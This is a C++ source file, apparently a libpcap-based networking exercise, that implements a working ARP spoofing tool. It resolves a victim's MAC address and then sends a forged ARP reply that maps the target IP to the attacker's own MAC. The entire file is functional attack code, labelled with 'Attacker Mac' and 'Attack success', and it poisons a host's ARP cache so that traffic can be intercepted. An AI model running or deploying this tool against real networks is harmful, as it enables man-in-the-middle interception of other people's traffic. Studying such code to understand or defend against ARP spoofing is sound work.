#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void get_attacker_mac(char* dev, Mac* my_mac) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFHWADDR, &ifr);
	*my_mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
	printf("Attacker Mac: %s\n", std::string(*my_mac).c_str());
}

void get_attacker_ip(char* dev, Ip* my_ip) {
	struct ifreq ifr;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	ioctl(s, SIOCGIFADDR, &ifr);
	*my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
	printf("Attacker IP: %s\n", std::string(*my_ip).c_str());
}

void send_arp(pcap_t* handle, Mac destination_mac, Mac source_mac, uint16_t op, Mac sender_mac, Ip sender_ip, Mac target_mac, Ip target_ip) {
	EthArpPacket packet;
	packet.eth_.dmac_ = destination_mac;
	packet.eth_.smac_ = source_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(op);
	packet.arp_.smac_ = sender_mac;
	packet.arp_.sip_ = htonl(sender_ip);
	packet.arp_.tmac_ = target_mac;
	packet.arp_.tip_ = htonl(target_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else {
		printf("Attack success\n");
	}
}


int main(int argc, char* argv[]) {
	if (argc % 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	Mac my_mac, sender_mac;
	get_attacker_mac(dev, &my_mac);

	Ip my_ip;
	get_attacker_ip(dev, &my_ip);

	printf("\n");

	for(int i = 2; i < argc; i+=2) {
		Ip sender_ip = Ip(argv[i]);
		Ip target_ip = Ip(argv[i+1]);

		send_arp(handle, Mac("ff:ff:ff:ff:ff:ff"), my_mac, ArpHdr::Request ,my_mac, my_ip, Mac("00:00:00:00:00:00"), sender_ip);

		while(true) {
			struct pcap_pkthdr* header;
			const u_char* send_packet;
			int res = pcap_next_ex(handle, &header, &send_packet);
			if (res == 0) continue;
			if (res == -1 || res == -2) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			EthArpPacket* eth_arp_packet = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(send_packet));

			if(eth_arp_packet->eth_.type_ != htons(EthHdr::Arp)) continue;
			if(eth_arp_packet->arp_.op_ != htons(ArpHdr::Reply)) continue;
			if(eth_arp_packet->arp_.sip_!= htonl(sender_ip)) continue;

			sender_mac = eth_arp_packet->arp_.smac_;
			printf("Get sender MAC: %s\n", std::string(sender_mac).c_str());

			break;
		}

		send_arp(handle, sender_mac, my_mac, ArpHdr::Reply, my_mac, target_ip, sender_mac, sender_ip);

	}
	pcap_close(handle);
}